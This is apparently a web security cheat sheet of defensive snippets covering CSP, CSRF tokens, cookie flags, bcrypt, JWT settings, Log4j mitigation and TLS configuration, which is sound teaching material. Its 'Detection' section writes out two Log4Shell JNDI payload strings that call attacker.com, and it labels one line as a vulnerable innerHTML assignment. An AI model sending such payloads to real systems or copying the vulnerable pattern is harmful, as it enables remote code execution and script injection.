// Vulnerable
innerHTML = userInput;

// Safe
textContent = userInput;

// CSP header
Content-Security-Policy: default-src 'self'; script-src 'self'

// CSRF token in form
<input type="hidden" name="csrf_token" value="{{ token }}">

// SameSite cookie
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure

// Custom header check
X-Requested-With: XMLHttpRequest

// Password hashing (bcrypt)
import bcrypt
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))

// JWT best practices
{
  "alg": "HS256",
  "exp": 900,  // 15 min
  "iss": "professionalai.com"
}

# Detection
${jndi:ldap://attacker.com/a}
${jndi:dns://attacker.com}

# Mitigation (Log4j 2.10+)
-Dlog4j2.formatMsgNoLookups=true

# Fix: upgrade to 2.17.1+

# Strong TLS config (nginx)
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;
ssl_session_tickets off;
add_header Strict-Transport-Security "max-age=63072000" always;
